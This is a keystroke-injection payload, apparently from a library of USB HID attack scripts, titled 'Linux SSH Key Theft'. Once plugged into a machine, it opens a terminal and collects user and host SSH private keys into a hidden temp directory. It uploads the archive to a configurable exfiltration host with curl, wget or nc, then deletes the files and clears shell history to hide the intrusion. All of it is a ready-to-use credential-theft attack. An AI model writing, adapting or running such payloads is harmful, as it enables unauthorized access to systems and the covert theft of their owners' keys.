@id: linux-ssh-steal
@name: Linux SSH Key Theft
@description: Steals SSH private keys from the target Linux system
@category: linux
@severity: critical
@param: EXFIL_HOST | string | required | Exfiltration server IP | 192.168.1.100
@param: EXFIL_PORT | number | required | Exfiltration server port | 8080

DELAY 1000
CTRL ALT t
DELAY 1000
STRING mkdir -p /tmp/.ssh_keys
DELAY 300
ENTER
STRING cp -r ~/.ssh/* /tmp/.ssh_keys/ 2>/dev/null || true
DELAY 300
ENTER
STRING cp /etc/ssh/ssh_host_* /tmp/.ssh_keys/ 2>/dev/null || true
DELAY 300
ENTER
STRING find /home -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null | while read f; do cp "$f" /tmp/.ssh_keys/ 2>/dev/null; done
DELAY 300
ENTER
STRING find /root -name "id_rsa" -o -name "id_dsa" 2>/dev/null | while read f; do cp "$f" /tmp/.ssh_keys/ 2>/dev/null; done
DELAY 300
ENTER
STRING ls -la /tmp/.ssh_keys/
DELAY 300
ENTER
STRING tar czf /tmp/.ssh_keys.tar.gz -C /tmp .ssh_keys
DELAY 300
ENTER
STRING curl -X POST -F "file=@/tmp/.ssh_keys.tar.gz" http://{{EXFIL_HOST}}:{{EXFIL_PORT}}/upload 2>/dev/null || wget --post-file=/tmp/.ssh_keys.tar.gz http://{{EXFIL_HOST}}:{{EXFIL_PORT}}/upload 2>/dev/null || nc -w 3 {{EXFIL_HOST}} {{EXFIL_PORT}} < /tmp/.ssh_keys.tar.gz 2>/dev/null
DELAY 300
ENTER
STRING rm -rf /tmp/.ssh_keys /tmp/.ssh_keys.tar.gz
DELAY 300
ENTER
STRING history -c
DELAY 300
ENTER
